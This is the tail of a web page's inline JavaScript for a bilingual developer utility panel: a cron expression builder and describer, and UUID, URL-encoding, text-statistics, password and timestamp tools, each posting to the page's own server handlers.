  document.getElementById('cronOutput').textContent=expr;
  describeCron(parts);
}
function setCron(expr){
  const parts=expr.split(' ');
  const fields=['minute','hour','day_month','month','day_week'];
  fields.forEach((f,i)=>{const el=document.getElementById('cron-'+f);if(el)el.value=parts[i]||'*';});
  document.getElementById('cronOutput').textContent=expr;
  describeCron(parts);
}
function describeCron(parts){
  const el=document.getElementById('cronDesc');
  if(!el)return;
  const [min,hr,dom,mon,dow]=parts;
  let desc=[];
  if(min==='*')desc.push(LANG==='id'?'setiap menit':'every minute');
  else if(min.startsWith('*/'))desc.push((LANG==='id'?'setiap ':'every ')+min.slice(2)+(LANG==='id'?' menit':' minutes'));
  else desc.push((LANG==='id'?'menit ke-':'at minute ')+min);
  if(hr!=='*'){
    if(hr.startsWith('*/'))desc.push((LANG==='id'?'setiap ':'every ')+hr.slice(2)+(LANG==='id'?' jam':' hours'));
    else if(hr.includes('-')){const [a,b]=hr.split('-');desc.push((LANG==='id'?'jam ':'hour ')+a+'-'+b);}
    else desc.push((LANG==='id'?'jam ':'at hour ')+hr);
  }
  if(dom!=='*') desc.push((LANG==='id'?'tanggal ':'on day ')+dom);
  if(mon!=='*'){const months=['','Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];desc.push((LANG==='id'?'bulan ':'in ')+( months[parseInt(mon)]||mon));}
  if(dow!=='*'){const days=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];desc.push((LANG==='id'?'hari ':'on ')+(days[parseInt(dow)]||dow));}
  el.textContent=desc.join(', ');
}

// ── UUID GENERATOR ──
async function doUUID(){
  const count=parseInt(document.getElementById('uuidCount').value)||1;
  const fd=new FormData();
  fd.append('tool_uuid','1');
  fd.append('uuid_count',Math.min(Math.max(count,1),20));
  try{
    const resp=await fetch(window.location.href,{method:'POST',body:fd});
    const d=await resp.json();
    const el=document.getElementById('uuidResult');
    if(d.uuids) el.textContent=d.uuids.join('\n');
  }catch(e){alert(e.message);}
}

// ── URL ENCODER/DECODER ──
async function doUrlEnc(op){
  const txt=document.getElementById('urlencInput').value;
  const fd=new FormData();
  fd.append('tool_urlenc','1');
  fd.append('urlenc_op',op);
  fd.append('urlenc_text',txt);
  try{
    const resp=await fetch(window.location.href,{method:'POST',body:fd});
    const d=await resp.json();
    document.getElementById('urlencResult').textContent=d.result||'—';
  }catch(e){alert(e.message);}
}

// ── TEXT STATISTICS ──
async function doTextStats(){
  const txt=document.getElementById('statsInput').value;
  const fd=new FormData();
  fd.append('tool_textstats','1');
  fd.append('stats_text',txt);
  try{
    const resp=await fetch(window.location.href,{method:'POST',body:fd});
    const d=await resp.json();
    document.getElementById('stat-chars').textContent=d.chars||0;
    document.getElementById('stat-charsnospace').textContent=d.charsnospace||0;
    document.getElementById('stat-words').textContent=d.words||0;
    document.getElementById('stat-lines').textContent=d.lines||0;
    document.getElementById('stat-sentences').textContent=d.sentences||0;
  }catch(e){console.error(e);}
}

// ── PASSWORD GENERATOR ──
async function doPassGen(){
  const len=parseInt(document.getElementById('passLen').value)||16;
  const special=document.getElementById('passSpecial').checked;
  const fd=new FormData();
  fd.append('tool_passgen','1');
  fd.append('pass_len',len);
  if(special) fd.append('pass_special','1');
  try{
    const resp=await fetch(window.location.href,{method:'POST',body:fd});
    const d=await resp.json();
    document.getElementById('passResult').textContent=d.password||'—';
  }catch(e){alert(e.message);}
}

// ── TIMESTAMP CONVERTER ──
async function doTimestamp(){
  const val=document.getElementById('tsInput').value;
  const op=document.querySelector('input[name="tsOp"]:checked').value;
  const fd=new FormData();
  fd.append('tool_timestamp','1');
  fd.append('ts_op',op);
  fd.append('ts_val',val);
  try{
    const resp=await fetch(window.location.href,{method:'POST',body:fd});
    const d=await resp.json();
    document.getElementById('tsResult').textContent=d.result||'—';
  }catch(e){alert(e.message);}
}

function updateTsOp(){
  document.getElementById('tsInput').placeholder=document.querySelector('input[name="tsOp"]:checked').value==='todate'?'1734891600':'2025-04-22 15:30:00';
}

document.addEventListener('DOMContentLoaded',()=>{buildCron();calcChmod();});
</script>
</body>
</html>